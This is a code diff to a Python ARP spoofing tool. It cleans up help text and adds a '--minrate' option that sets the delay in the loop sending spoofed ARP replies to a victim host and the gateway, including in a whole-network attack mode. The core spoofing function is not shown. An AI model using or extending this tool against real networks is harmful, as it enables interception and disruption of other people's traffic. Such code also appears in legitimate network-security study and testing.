@@ -27,21 +27,24 @@ def main():
 	parser = optparse.OptionParser(
 		'Usage of the program: ' + '-t <target IP>' + ' -s <spoof IP>\n')
 	parser.add_option('-t', '--target', dest='victim', type='string',
-					  help='specify a target IP, the victim IP)')
+					  help='specify a target IP, the victim IP')
 	parser.add_option('-s', '--spoof', dest='spoof', type='string',
-					  help='specify a spoof IP or a pretend IP, usually the gateway of the network)')
+					  help='specify a spoof IP or a pretend IP, usually the gateway of the network')
 	parser.add_option('-c', '--check', action="store_true", default=False,
 					  help='check connectivity of the victim , by default is False')
 	parser.add_option('-n', '--network', action="store_true", default=False,
-					  help='define the target as a network')
+					  help='define the network as a target')
 	parser.add_option('-v', '--verbose', action="store_false", default=True,
 					  help='set verbose to False')
+	parser.add_option('-r', '--minrate', dest="minrate", default=100,
+					  help='specify minimum rate in network attack (ms)')
 	options , args  = parser.parse_args()
 	victim = options.victim
 	spoof = options.spoof
 	net = options.network
 	verbose = options.verbose
 	check = options.check
+	minrate = options.minrate
 	if victim : victim = victim.strip()
 
 
@@ -52,9 +55,9 @@ def main():
 		if verbose : print(INFO("default ip spoof : ") , end="" , flush=True)
 		spoof = gateway()
 		if verbose : print(BLUE(spoof) , flush=True)
-	start(victim , spoof , net  , verbose , check)
+	start(victim , spoof , net  , verbose , check ,minrate)
 
-def start(victim , spoof , net , verbose , check) : 
+def start(victim , spoof , net , verbose , check, minrate) : 
 	if net :
 		try : 
 			inet , addr , mask , bd = getnetwork()
@@ -85,7 +88,7 @@ def start(victim , spoof , net , verbose , check) :
 				ArpSpoof( mac_victim , victim, spoof)
 				ArpSpoof(mac_spoof ,spoof, victim)
 				N += 2
-				time.sleep(100)
+				time.sleep(minrate)
 		except ValueError : 
 			if verbose :  print(DANGER("Error in IP format") , flush=True)
 			exit(0)
